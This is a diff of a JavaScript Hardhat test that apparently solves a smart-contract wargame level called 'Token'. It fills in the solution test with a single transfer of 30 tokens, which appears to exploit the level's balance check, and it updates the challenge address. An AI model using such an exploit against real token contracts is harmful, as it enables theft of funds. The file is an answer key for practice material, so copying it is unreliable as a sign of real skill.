@@ -15,12 +15,18 @@ before(async () => {
     [eoa, accomplice] = accounts;
     const challengeFactory = await ethers.getContractFactory(`Token`);
     const challengeAddress = await createChallenge(
-        `0x63bE8347A617476CA461649897238A31835a32CE`
+        `0xB4802b28895ec64406e45dB504149bfE79A38A57`
     );
     challenge = await challengeFactory.attach(challengeAddress);
 });
 
-it("solves the challenge", async function () {});
+it("solves the challenge", async function () {
+    let tx = await challenge.transfer(
+        "0xD76e3Eb0e172c9eD0D74d6a2d0b740A4922086B7",
+        30
+    );
+    await tx.wait();
+});
 
 after(async () => {
     expect(await submitLevel(challenge.address), "level not solved").to.be.true;
